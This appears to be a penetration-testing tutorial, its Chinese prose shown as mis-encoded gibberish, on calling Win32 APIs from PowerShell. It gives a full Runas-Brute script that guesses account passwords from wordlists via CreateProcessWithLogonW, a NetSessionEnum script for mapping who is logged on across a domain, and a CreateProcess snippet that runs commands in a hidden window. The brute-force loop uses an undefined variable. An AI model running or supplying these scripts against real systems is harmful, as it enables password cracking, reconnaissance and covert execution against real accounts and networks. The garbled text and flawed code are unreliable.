# powershell(8)-win32API

Powershellè¿˜æœ‰ä¸€å¤§å¼ºå¤§ä¹‹å¤„å°±æ˜¯èƒ½è°ƒç”¨Win32-Api(åºŸè¯)ï¼Œè¿™ç»™æˆ‘ä»¬å¸¦æ¥äº†æå¤§çš„ä¾¿åˆ©ï¼Œä¹Ÿå°±æ˜¯APIèƒ½å®ç°çš„åŠŸèƒ½å½“æˆ‘ä»¬åœ¨æ¸—é€çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬èƒ½è½»è€Œæ˜“ä¸¾çš„å®ç°ï¼Œè€Œæˆ‘ä»¬åªéœ€è¦åœ¨å¯¹æ–¹æœºå™¨æ‰§è¡Œä¸€æ¡å‘½ä»¤å³å¯ã€‚

ä¸‹é¢æˆ‘ä»¬é€šè¿‡å‡ ä¸ªè„šæœ¬æ¥ä»‹ç»æˆ‘ä»¬å¦‚ä½•é€šè¿‡Powershellæ¥è°ƒç”¨Win32Apiï¼Œä»è€Œè¾¾åˆ°å­¦ä¹ çš„ç›®çš„ï¼Œä¹Ÿèƒ½å¤Ÿä¸ºå¤§å®¶çš„è„šæœ¬å·¥å…·å¢æ·»xx....:)

## Runas

runas.exeæ˜¯ä¸€ä¸ªWindowsè‡ªå¸¦çš„ç¨‹åºï¼Œä¸€æ¡ç®€å•çš„å‘½ä»¤`runas /user:corp\bob cmd`å¯ä»¥ç”¨åŸŸå†…å¦å¤–ä¸€ä¸ªç”¨æˆ·çš„èº«ä»½å¼€ä¸€ä¸ªshellï¼Œå½“ç„¶éœ€è¦ä½ è¾“å…¥å¯†ç 

è¿™æ¬¡æˆ‘ä»¬ç›´æ¥é€šè¿‡Powershellæ¥å®ç°runasï¼Œä½†æ˜¯æˆ‘ä»¬å°±ä¸ä»‹ç»ä»–ç›´æ¥çš„ç”¨å¤„äº†ï¼Œé‚£ä¹ˆrunasæˆ‘ä»¬èƒ½æƒ³åˆ°çš„åˆ©ç”¨åœºæ™¯è¿˜æœ‰ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥å¯†ç å¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡Œçˆ†ç ´ã€‚

```powershell

function Runas-Brute {

<#
.SYNOPSIS
    Parameters:

     -UserList              Specifiy usernameList.
     
     -PasswordList          Specify passwordList.
     
     -Domain            Specify domain. Defaults to localhost if not specified.
     
     -LogonType         dwLogonFlags:
                          0x00000001 --> LOGON_WITH_PROFILE
                                           Log on, then load the user profile in the HKEY_USERS registry
                                           key. The function returns after the profile is loaded.
                                           
                          0x00000002 --> LOGON_NETCREDENTIALS_ONLY (= /netonly)
                                           Log on, but use the specified credentials on the network only.
                                           The new process uses the same token as the caller, but the
                                           system creates a new logon session within LSA, and the process
                                           uses the specified credentials as the default credentials.
     
     -Binary            Full path of the module to be executed.
                       
     -Args              Arguments to pass to the module, e.g. "/c calc.exe". Defaults
                        to $null if not specified.
                       

.EXAMPLE
    Start cmd with a local account
    C:\PS> Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Binary C:\Windows\System32\cmd.exe -LogonType 0x1
    
.EXAMPLE
    Start cmd with remote credentials. Equivalent to "/netonly" in runas.
    C:\PS> Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2
#>

    param (
        [Parameter(Mandatory = $True)]
        [string]$UserList,
        [Parameter(Mandatory = $True)]
        [string]$PasswordList,
        [Parameter(Mandatory = $False)]
        [string]$Domain=".",
        [Parameter(Mandatory = $True)]
        [string]$Binary,
        [Parameter(Mandatory = $False)]
        [string]$Args=$null,
        [Parameter(Mandatory = $True)]
        [int][ValidateSet(1,2)]
        [string]$LogonType
    )  

    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    public static class Advapi32
    {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref  STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);
    }
    
    public static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();
    }
"@

    # StartupInfo Struct
    $StartupInfo = New-Object STARTUPINFO
    $StartupInfo.dwFlags = 0x00000001
    $StartupInfo.wShowWindow = 0x0001
    $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
    
    # ProcessInfo Struct
    $ProcessInfo = New-Object PROCESS_INFORMATION
    
    # åˆ›å»ºä¸€ä¸ªåœ¨å½“å‰ç›®å½•çš„shell
    $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    echo "`n[>] Calling Advapi32::CreateProcessWithLogonW"

    $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
    $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
    if (!$usernames) { 
        $usernames = $UserList
        Write-Verbose "UserList file does not exist."
        Write-Verbose $usernames
    }
    if (!$passwords) {
        $passwords = $PasswordList
        Write-Verbose "PasswordList file does not exist."
        Write-Verbose $passwords
    }

    :UsernameLoop foreach ($username in $usernames)
    {
        foreach ($Password in $Passwords)
        {
            $CallResult = [Advapi32]::CreateProcessWithLogonW(
                $User, $Domain, $Password, $LogonType, $Binary,
                $Args, 0x04000000, $null, $GetCurrentPath,
                [ref]$StartupInfo, [ref]$ProcessInfo)

            if (!$CallResult) {
                echo "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)"
                echo "Test: " , $User , $password
            } else {
                echo "`n[+] Success, process details:"
                Get-Process -Id $ProcessInfo.dwProcessId
                echo "Test: " , $User , $password
                break UsernameLoop
            } 
        }
    }
}
```
è¿™æ˜¯æ•´ä¸ªè„šæœ¬çš„ä»£ç ï¼Œé‚£ä¹ˆä¸‹é¢å°±æ˜¯è¿è¡Œçš„ç»“æœï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‡å®šå¥½ä»–çš„å­—å…¸æ–‡ä»¶å³å¯

![](https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/1.png)

## NetSessionEnum

ä¸‹é¢ä¸€ä¸ªç®€å•çš„ä»‹ç»NetSessionEnumã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£çš„æ˜¯ï¼Œåœ¨çœŸå®çš„æµ‹è¯•è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦çŸ¥é“åŸŸå†…çš„ç»„ç»‡æ¶æ„ï¼ŒåŸŸå†…çš„æ´»åŠ¨æœºå™¨ç­‰ç­‰ã€‚é‚£ä¹ˆå¯ä»¥æä¾›çš„å·¥å…·ä¹Ÿæœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šPVEFindADUser.exe psloggedon.exe netsess.exe hunter.exeç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©powershellä½œä¸ºæˆ‘ä»¬çš„æœ€ä½³åˆ©ç”¨å·¥å…·ï¼Œå…¶å®ä¸Šé¢è®²åˆ°çš„å·¥å…·éƒ½æ˜¯è°ƒç”¨äº†NetSessionEnum APIï¼Œé‚£ä¹ˆæˆ‘ä»¬Powershellä¹Ÿèƒ½å¤Ÿéå¸¸æ–¹ä¾¿çš„è°ƒç”¨æ­¤APIï¼Œè€Œä¸”æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åŸŸç®¡çš„æƒé™ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™é‡Œå¦‚ä½•å®ç°ã€‚

```powershell
function Invoke-NetSessionEnum {
<#
.SYNOPSIS

	ä½¿ç”¨NetSessionEnumå»åˆ—å‡ºç›®å‰çš„æ´»åŠ¨ğŸ¨

.EXAMPLE
	PS> Invoke-NetSessionEnum -HostName SomeHostName

#>

	param (
        [Parameter(Mandatory = $True)]
		[string]$HostName
	)  

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SESSION_INFO_10
	{
		[MarshalAs(UnmanagedType.LPWStr)]public string OriginatingHost;
		[MarshalAs(UnmanagedType.LPWStr)]public string DomainUser;
		public uint SessionTime;
		public uint IdleTime;
	}
	
	public static class Netapi32
	{
		[DllImport("Netapi32.dll", SetLastError=true)]
			public static extern int NetSessionEnum(
				[In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
				[In,MarshalAs(UnmanagedType.LPWStr)] string UncClientName,
				[In,MarshalAs(UnmanagedType.LPWStr)] string UserName,
				Int32 Level,
				out IntPtr bufptr,
				int prefmaxlen,
				ref Int32 entriesread,
				ref Int32 totalentries,
				ref Int32 resume_handle);
				
		[DllImport("Netapi32.dll", SetLastError=true)]
			public static extern int NetApiBufferFree(
				IntPtr Buffer);
	}
"@
	
	# åˆ›å»º SessionInfo10 ç»“æ„
	$SessionInfo10 = New-Object SESSION_INFO_10
	$SessionInfo10StructSize = [System.Runtime.InteropServices.Marshal]::SizeOf($SessionInfo10) # Grab size to loop bufptr
	$SessionInfo10 = $SessionInfo10.GetType() 	
	# NetSessionEnum çš„å‚æ•°
	$OutBuffPtr = [IntPtr]::Zero 
	$EntriesRead = $TotalEntries = $ResumeHandle = 0
	$CallResult = [Netapi32]::NetSessionEnum($HostName, "", "", 10, [ref]$OutBuffPtr, -1, [ref]$EntriesRead, [ref]$TotalEntries, [ref]$ResumeHandle)
	
	if ($CallResult -ne 0){
		echo "something wrong!`nError Code: $CallResult"
	}
	
	else {
	
		if ([System.IntPtr]::Size -eq 4) {
			echo "`nNetapi32::NetSessionEnum Buffer Offset  --> 0x$("{0:X8}" -f $OutBuffPtr.ToInt32())"
		}
		else {
			echo "`nNetapi32::NetSessionEnum Buffer Offset  --> 0x$("{0:X16}" -f $OutBuffPtr.ToInt64())"
		}
		
		echo "Result-set contains $EntriesRead session(s)!"
	
		# Change buffer offset to int
		$BufferOffset = $OutBuffPtr.ToInt64()
		
		# Loop buffer entries and cast pointers as SessionInfo10
		for ($Count = 0; ($Count -lt $EntriesRead); $Count++){
			$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
			$Info = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr,[type]$SessionInfo10)
			$Info
			$BufferOffset = $BufferOffset + $SessionInfo10StructSize
		}
		
		echo "`nCalling NetApiBufferFree, no memleaks here!"
		[Netapi32]::NetApiBufferFree($OutBuffPtr) |Out-Null
	}
}
```

![](https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/2.png)


## CreateProcess

æœ€åæˆ‘ä»¬åœ¨çœ‹ä¸€ä¸ªæˆ‘ä»¬ç”¨çš„æœ€å¤šçš„APIä¾‹å­ï¼šè¿›ç¨‹åˆ›å»ºï¼Œæˆ‘ä»¬éœ€è¦è¿œç¨‹åˆ›å»ºä¸€ä¸ªæ²¡æœ‰çª—å£è€Œå»tokenç”±æˆ‘ä»¬æŒ‡å®šçš„è¿›ç¨‹ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå¹²å¤§å®¶å¯ä»¥è‡ªå·±é¢†æ‚Ÿã€‚é‚£ä¹ˆCreateProcess APIå°±èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
 public IntPtr hProcess;
 public IntPtr hThread;
 public uint dwProcessId;
 public uint dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
 public uint cb;
 public string lpReserved;
 public string lpDesktop;
 public string lpTitle;
 public uint dwX;
 public uint dwY;
 public uint dwXSize;
 public uint dwYSize;
 public uint dwXCountChars;
 public uint dwYCountChars;
 public uint dwFillAttribute;
 public uint dwFlags;
 public short wShowWindow;
 public short cbReserved2;
 public IntPtr lpReserved2;
 public IntPtr hStdInput;
 public IntPtr hStdOutput;
 public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
 public int length;
 public IntPtr lpSecurityDescriptor;
 public bool bInheritHandle;
}

public static class Kernel32
{
 [DllImport("kernel32.dll", SetLastError=true)]
 public static extern bool CreateProcess(
 string lpApplicationName,
 string lpCommandLine,
 ref SECURITY_ATTRIBUTES lpProcessAttributes, 
 ref SECURITY_ATTRIBUTES lpThreadAttributes,
 bool bInheritHandles,
 uint dwCreationFlags, 
 IntPtr lpEnvironment,
 string lpCurrentDirectory,
 ref STARTUPINFO lpStartupInfo, 
 out PROCESS_INFORMATION lpProcessInformation);
}
"@

# StartupInfo Struct
$StartupInfo = New-Object STARTUPINFO
$StartupInfo.dwFlags = 0x00000001 # STARTF_USESHOWWINDOW
$StartupInfo.wShowWindow = 0x0000 # SW_HIDE
$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size

# ProcessInfo Struct
$ProcessInfo = New-Object PROCESS_INFORMATION

# SECURITY_ATTRIBUTES Struct (Process &amp; Thread)
$SecAttr = New-Object SECURITY_ATTRIBUTES
$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)

# CreateProcess In CurrentDirectory
$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName

# Call CreateProcess
[Kernel32]::CreateProcess("C:\Windows\System32\cmd.exe", "/c calc.exe", [ref] $SecAttr, [ref] $SecAttr, $false,
0x08000000, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
```

å…¶ä¸­çª—å£é—®é¢˜æ˜¯åœ¨`$StartupInfo.wShowWindow = 0x0000 # SW_HIDE`è¿™é‡Œè§£å†³çš„ï¼Œä¸‹é¢æ˜¯æµ‹è¯•æ•ˆæœï¼š

![](https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/3.png)

å¯ä»¥çœ‹åˆ°è®¡ç®—å™¨æ˜¯åœ¨cmdè¿›ç¨‹ä¸‹é¢çš„ï¼Œé‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªéœ€æ±‚æ˜¯ä½¿ç”¨ä»€ä¹ˆTokenæ¥æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬ä½¿ç”¨APIï¼šCreateProcessAsUserWé‚£ä¹ˆå¤§å®¶å¯ä»¥å»ç ”ç©¶ä¸€ä¸‹å¦‚ä½•å®Œæˆä½¿ç”¨ç‰¹å®štokenæ‰“å¼€è¿›ç¨‹ã€‚
